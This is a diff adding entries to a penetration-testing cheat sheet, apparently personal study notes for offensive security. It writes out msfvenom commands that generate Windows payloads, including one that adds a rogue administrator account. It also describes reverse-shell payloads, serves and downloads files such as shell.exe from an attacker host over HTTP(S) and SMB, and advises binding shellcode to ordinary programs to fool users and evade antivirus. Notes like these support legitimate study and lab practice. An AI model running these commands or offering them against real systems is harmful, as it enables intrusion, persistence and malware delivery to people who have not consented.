@@ -18,6 +18,7 @@
 - [Searchexploit](#searchexploit)
 - [Code Analyse](#code-analyse)
 - [METASPLOIT](#metasploit)
+  - [msfvenom](#msfvenom)
   - [Meterpreter](#meterpreter)
   - [Metasploit with database](#metasploit-with-database)
     - [NMAP - DB\_NMAP](#nmap---db_nmap)
@@ -189,6 +190,11 @@
   4. [Powershell] powershell **Invoke-WebRequest -Uri** http://10.9.1.255:80/shell.exe **-Outfile** file.exe
   5. make executable: chmod +x file.ext
 
+- https: Create certificate + spawn https server
+  - openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
+  - python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
+- 
+
 - Option 2 - copy source
   1. Copy code from source and past in the target + save .sh
   2. make executable: chmod +x file.ext
@@ -197,6 +203,7 @@
   -  create server: sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
   -  create client: net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
   -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+  -  smbclient -U USER '//IP/folder'
 
 
 ## DNS, SMB, SNMP
@@ -227,6 +234,29 @@
 - unsetg => unset global values
 - background => putting a session in backgrou
 - sessions => display sessions
+
+## msfvenom
+- Many platforms and formats
+- Example generate hex of payload:
+  - Method 1
+    - msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
+  - raw binary file .bin:
+    - binary ==> msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
+  - convert to hex:
+    - xxd -i file.bin ==> generate payload for .c
+
+- Stage vs Stageless
+  - stageless: shell_reverse_tcp = one thing only
+  - staged: /shell/reverse_tcp
+
+- Smaller payloads
+  - Payload with a single command: **CMD='net user pwnd Password321 /add;net localgroup administrators pwdn /add'**
+
+- Binding
+  - Merge shellcode WITH normal program
+  - Fool users
+  - still can be detected by AVs
+  - Better: encode + encrypt + packers + binder
 
 ## Meterpreter
 - sysinfo
